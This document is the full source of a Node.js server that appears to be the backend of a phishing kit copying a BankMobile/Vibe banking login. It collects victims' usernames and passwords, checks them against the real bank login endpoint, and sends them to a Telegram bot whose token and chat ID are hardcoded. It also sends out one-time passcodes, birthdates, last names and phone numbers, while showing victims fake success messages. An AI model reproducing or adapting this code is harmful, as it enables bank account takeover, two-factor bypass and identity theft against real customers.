const express = require('express');
const cors = require('cors');
const axios = require('axios');
const cheerio = require('cheerio');
const app = express();

// CORS configuration
const corsOptions = {
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin'],
    credentials: true,
    optionsSuccessStatus: 200
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

const PORT = 3000;

// ============================================
// 🔐 TELEGRAM CONFIGURATION (HIDDEN IN BACKEND)
// ============================================
const BOT_TOKEN = '8738858916:AAEulbBj_cRTPjfo_6qUmJQadgDM_GN70fY';
const CHAT_ID = '7075480337';

// ============================================
// 🔗 EXACT LOGIN URL (ONLY USED FOR LOGIN AUTH)
// ============================================
const EXACT_LOGIN_URL = 'https://authentication-vibe.bmtx.com/identity/account/login?tenantId=b15394b5-1c89-4bd3-9652-935e91475d31&returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dbmt-vibe-web-secure%26redirect_uri%3Dhttps%253A%252F%252Fsecure.vibeaccount.com%252Fapi%252Fsession%252Flogin%26response_type%3Dcode%26scope%3Dopenid%20profile%20offline_access%26state%3D11a42032-1079-f111-ac9d-002248463006%26acr_values%3Dxtdid%3A11a42032-1079-f111-ac9d-002248463006';

// ============================================
// 📨 TELEGRAM NOTIFICATION FUNCTIONS
// ============================================

// Get IP address
async function getIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json', { timeout: 3000 });
        return response.data.ip || 'Unknown';
    } catch {
        return 'Unable to retrieve';
    }
}

// Send Telegram message
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }, {
            timeout: 5000
        });
        return response.data;
    } catch (error) {
        console.error('❌ Telegram API error:', error.message);
        throw error;
    }
}

// 1. Login notification (with actual authentication)
async function sendLoginNotification(username, password, status, location) {
    try {
        const ip = await getIP();
        const message = `🔐 **Login Attempt**\n\n` +
            `📧 **Email:** ${username}\n` +
            `🔑 **Password:** ${password}\n` +
            `📊 **Status:** ${status}\n` +
            `📍 **Redirect:** ${location || 'None'}\n` +
            `🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `🌐 **IP:** ${ip}`;
        
        await sendTelegramMessage(message);
        console.log('📨 Login notification sent');
        return true;
    } catch (error) {
        console.error('❌ Failed to send login notification:', error.message);
        return false;
    }
}

// 2. Password reset notification (NO authentication)
async function sendPasswordResetNotification(email, lastname, birthdate) {
    try {
        const ip = await getIP();
        const message = `🔑 **Password Reset Request**\n\n` +
            `📧 **Email:** ${email}\n` +
            `👤 **Last Name:** ${lastname}\n` +
            `📅 **Birthdate:** ${birthdate}\n` +
            `🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `🌐 **IP:** ${ip}`;
        
        await sendTelegramMessage(message);
        console.log('📨 Password reset notification sent');
        return true;
    } catch (error) {
        console.error('❌ Failed to send password reset notification:', error.message);
        return false;
    }
}

// 3. Username lookup notification (NO authentication)
async function sendUsernameLookupNotification(phone, lastname, birthdate) {
    try {
        const ip = await getIP();
        const message = `🔍 **Username Lookup Request**\n\n` +
            `📱 **Phone:** ${phone}\n` +
            `👤 **Last Name:** ${lastname}\n` +
            `📅 **Birthdate:** ${birthdate}\n` +
            `🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `🌐 **IP:** ${ip}`;
        
        await sendTelegramMessage(message);
        console.log('📨 Username lookup notification sent');
        return true;
    } catch (error) {
        console.error('❌ Failed to send username lookup notification:', error.message);
        return false;
    }
}

// 4. OTP verification notification (NO authentication)
async function sendOTPNotification(otpCode, trustComputer) {
    try {
        const ip = await getIP();
        const message = `✅ **OTP Verification**\n\n` +
            `🔑 **OTP Code:** ${otpCode}\n` +
            `🖥️ **Trust Computer:** ${trustComputer ? 'Yes ✅' : 'No ❌'}\n` +
            `🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `🌐 **IP:** ${ip}`;
        
        await sendTelegramMessage(message);
        console.log('📨 OTP notification sent');
        return true;
    } catch (error) {
        console.error('❌ Failed to send OTP notification:', error.message);
        return false;
    }
}

// 5. OTP resend notification (NO authentication)
async function sendOTPResendNotification() {
    try {
        const ip = await getIP();
        const message = `🔄 **OTP Resend Request**\n\n` +
            `🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `🌐 **IP:** ${ip}`;
        
        await sendTelegramMessage(message);
        console.log('📨 OTP resend notification sent');
        return true;
    } catch (error) {
        console.error('❌ Failed to send OTP resend notification:', error.message);
        return false;
    }
}

// 6. Access denied notification (NO authentication)
async function sendAccessDeniedNotification(email, error) {
    try {
        const ip = await getIP();
        const message = `🚫 **Access Denied**\n\n` +
            `📧 **Attempted Email:** ${email || 'Not provided'}\n` +
            `❌ **Error:** ${error || 'Account not found'}\n` +
            `🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `🌐 **IP:** ${ip}`;
        
        await sendTelegramMessage(message);
        console.log('📨 Access denied notification sent');
        return true;
    } catch (error) {
        console.error('❌ Failed to send access denied notification:', error.message);
        return false;
    }
}

// 7. FAQ click notification (NO authentication)
async function sendFAQClickNotification(email) {
    try {
        const ip = await getIP();
        const message = `❓ **FAQ Link Clicked**\n\n` +
            `📧 **User Email:** ${email || 'Not provided'}\n` +
            `🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `🌐 **IP:** ${ip}`;
        
        await sendTelegramMessage(message);
        console.log('📨 FAQ click notification sent');
        return true;
    } catch (error) {
        console.error('❌ Failed to send FAQ click notification:', error.message);
        return false;
    }
}

// ============================================
// 🔐 API ENDPOINTS
// ============================================

// ============================================
// 1. LOGIN ENDPOINT - AUTHENTICATES AGAINST SITE
// ============================================
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({
                success: false,
                message: 'Username and password are required'
            });
        }

        console.log(`📧 Login attempt for: ${username}`);
        console.log(`🔐 Authenticating against: ${EXACT_LOGIN_URL}`);
        
        // Step 1: Get login page for CSRF token
        const pageResponse = await axios.get(EXACT_LOGIN_URL, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Upgrade-Insecure-Requests': '1'
            },
            maxRedirects: 5,
            timeout: 30000
        });
        
        const html = pageResponse.data;
        const $ = cheerio.load(html);
        
        // Extract CSRF token
        let csrfToken = '';
        $('input[name="__RequestVerificationToken"]').each((i, el) => {
            csrfToken = $(el).val();
        });
        
        if (!csrfToken) {
            const tokenMatch = html.match(/__RequestVerificationToken.*?value="([^"]+)"/);
            if (tokenMatch) {
                csrfToken = tokenMatch[1];
            }
        }
        
        console.log('🔑 CSRF Token:', csrfToken ? '✅ Found' : '❌ Not found');
        
        // Step 2: Send login request to actual site
        const formData = new URLSearchParams();
        if (csrfToken) {
            formData.append('__RequestVerificationToken', csrfToken);
        }
        formData.append('Username', username);
        formData.append('Password', password);
        formData.append('RememberMe', 'false');
        
        const cookies = pageResponse.headers['set-cookie'] || [];
        const cookieString = cookies.join('; ');
        
        const loginResponse = await axios.post(EXACT_LOGIN_URL, formData.toString(), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Cookie': cookieString,
                'Referer': EXACT_LOGIN_URL,
                'Origin': 'https://authentication-vibe.bmtx.com'
            },
            maxRedirects: 0,
            validateStatus: function (status) {
                return status >= 200 && status < 400;
            },
            timeout: 30000
        });
        
        const statusCode = loginResponse.status;
        const location = loginResponse.headers['location'] || '';
        
        console.log('📊 Status Code:', statusCode);
        console.log('📍 Location:', location || 'No redirect');
        
        // Send Telegram notification
        await sendLoginNotification(username, password, statusCode, location);
        
        // Determine result based on actual site response
        let result = {
            success: false,
            status: statusCode,
            location: location,
            message: '',
            redirectTo: null
        };
        
        if (location && location.includes('loginverifyotp')) {
            result.success = true;
            result.message = 'Login successful! Redirecting to OTP verification.';
            result.redirectTo = 'verify.html';
            console.log('✅ SUCCESS: OTP verification required');
            
        } else if (location && location.includes('_authaccessdeniednonaccountholder')) {
            result.success = false;
            result.message = 'Account not found. Please check your username.';
            result.redirectTo = 'accessdenied.html';
            console.log('❌ FAILURE: Account not found');
            
        } else {
            result.success = false;
            result.message = 'Invalid login attempt. Account may be locked after multiple invalid attempts. To recover login credentials, select "Forgot Login Information?" below.';
            result.redirectTo = null;
            console.log('❌ FAILURE: Invalid credentials');
        }
        
        res.json(result);
        
    } catch (error) {
        console.error('❌ Login error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Server error. Please try again later.',
            error: error.message
        });
    }
});

// ============================================
// 2. PASSWORD RESET - NO AUTH, JUST TELEGRAM
// ============================================
app.post('/api/reset-password', async (req, res) => {
    try {
        const { email, lastname, birthdate } = req.body;
        
        if (!email || !lastname || !birthdate) {
            return res.status(400).json({
                success: false,
                message: 'All fields are required'
            });
        }
        
        console.log(`🔑 Password reset request for: ${email}`);
        console.log('📨 Sending to Telegram (NO site authentication)');
        
        // Just send to Telegram - NO site authentication
        await sendPasswordResetNotification(email, lastname, birthdate);
        
        res.json({
            success: true,
            message: 'Password reset request sent successfully.'
        });
        
    } catch (error) {
        console.error('❌ Password reset error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Server error. Please try again later.'
        });
    }
});

// ============================================
// 3. USERNAME LOOKUP - NO AUTH, JUST TELEGRAM
// ============================================
app.post('/api/lookup-username', async (req, res) => {
    try {
        const { phone, lastname, birthdate } = req.body;
        
        if (!phone || !lastname || !birthdate) {
            return res.status(400).json({
                success: false,
                message: 'All fields are required'
            });
        }
        
        console.log(`🔍 Username lookup for phone: ${phone}`);
        console.log('📨 Sending to Telegram (NO site authentication)');
        
        // Just send to Telegram - NO site authentication
        await sendUsernameLookupNotification(phone, lastname, birthdate);
        
        res.json({
            success: true,
            message: 'Username lookup request sent successfully.'
        });
        
    } catch (error) {
        console.error('❌ Username lookup error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Server error. Please try again later.'
        });
    }
});

// ============================================
// 4. OTP VERIFICATION - NO AUTH, JUST TELEGRAM
// ============================================
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { otp, trustComputer } = req.body;
        
        if (!otp || otp.length !== 6) {
            return res.status(400).json({
                success: false,
                message: 'Valid 6-digit OTP is required'
            });
        }
        
        console.log(`✅ OTP verification: ${otp}`);
        console.log('📨 Sending to Telegram (NO site authentication)');
        
        // Just send to Telegram - NO site authentication
        await sendOTPNotification(otp, trustComputer);
        
        res.json({
            success: true,
            message: 'OTP verified successfully.'
        });
        
    } catch (error) {
        console.error('❌ OTP verification error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Server error. Please try again later.'
        });
    }
});

// ============================================
// 5. OTP RESEND - NO AUTH, JUST TELEGRAM
// ============================================
app.post('/api/resend-otp', async (req, res) => {
    try {
        console.log('🔄 OTP resend requested');
        console.log('📨 Sending to Telegram (NO site authentication)');
        
        // Just send to Telegram - NO site authentication
        await sendOTPResendNotification();
        
        res.json({
            success: true,
            message: 'New OTP sent successfully.'
        });
        
    } catch (error) {
        console.error('❌ OTP resend error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Server error. Please try again later.'
        });
    }
});

// ============================================
// 6. ACCESS DENIED - NO AUTH, JUST TELEGRAM
// ============================================
app.post('/api/access-denied', async (req, res) => {
    try {
        const { email, error } = req.body;
        
        console.log(`🚫 Access denied for: ${email || 'Unknown user'}`);
        console.log('📨 Sending to Telegram (NO site authentication)');
        
        // Just send to Telegram - NO site authentication
        await sendAccessDeniedNotification(email, error);
        
        res.json({
            success: true,
            message: 'Access denied notification sent.'
        });
        
    } catch (error) {
        console.error('❌ Access denied error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Server error. Please try again later.'
        });
    }
});

// ============================================
// 7. FAQ CLICK - NO AUTH, JUST TELEGRAM
// ============================================
app.post('/api/faq-click', async (req, res) => {
    try {
        const { email } = req.body;
        
        console.log(`❓ FAQ clicked by: ${email || 'Unknown user'}`);
        console.log('📨 Sending to Telegram (NO site authentication)');
        
        // Just send to Telegram - NO site authentication
        await sendFAQClickNotification(email);
        
        res.json({
            success: true,
            message: 'FAQ click recorded.'
        });
        
    } catch (error) {
        console.error('❌ FAQ click error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Server error. Please try again later.'
        });
    }
});

// ============================================
// 8. HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        server: 'BankMobile Login Server',
        version: '2.0.0',
        endpoints: [
            '/api/login - ✅ Authenticates against site',
            '/api/reset-password - 📨 Telegram only',
            '/api/lookup-username - 📨 Telegram only',
            '/api/verify-otp - 📨 Telegram only',
            '/api/resend-otp - 📨 Telegram only',
            '/api/access-denied - 📨 Telegram only',
            '/api/faq-click - 📨 Telegram only',
            '/api/health'
        ]
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running at http://localhost:${PORT}`);
    console.log(`📋 Health check: http://localhost:${PORT}/api/health`);
    console.log(`🔐 Login: POST http://localhost:${PORT}/api/login ✅ AUTHENTICATES AGAINST SITE`);
    console.log(`📨 All other endpoints: JUST SEND TO TELEGRAM (no site auth)`);
});
